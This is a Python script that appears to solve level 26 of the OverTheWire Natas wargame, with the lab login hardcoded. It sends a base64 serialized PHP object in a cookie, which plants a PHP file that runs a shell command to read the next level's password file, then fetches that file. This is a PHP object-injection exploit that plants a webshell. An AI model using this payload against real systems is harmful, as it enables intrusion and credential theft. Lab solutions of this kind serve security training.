import requests
import re

username = 'natas26'
password = '8A506rfIAXbKKk68yJeuTuRq4UfcK70k'

url = 'http://%s.natas.labs.overthewire.org/' % username

with open('natas26.html', 'w+') as out:
    session = requests.Session()
    res = session.get(url, auth=(username, password))
    content = res.text
    
    # run this command to get drawing cookie
    # php7.0 util_tools.php 2>/dev/null
    drawing = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiL2ltZy9wd25lZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
    session.cookies['drawing'] = drawing

    res = session.get(url + '?x1=0&x2=0&y500=3&y2=500',
                      auth=(username, password))
    content = res.text

    res = session.get(url + '/img/pwned.php', auth=(username, password))
    content = res.text
    print(content)
    out.write(content)
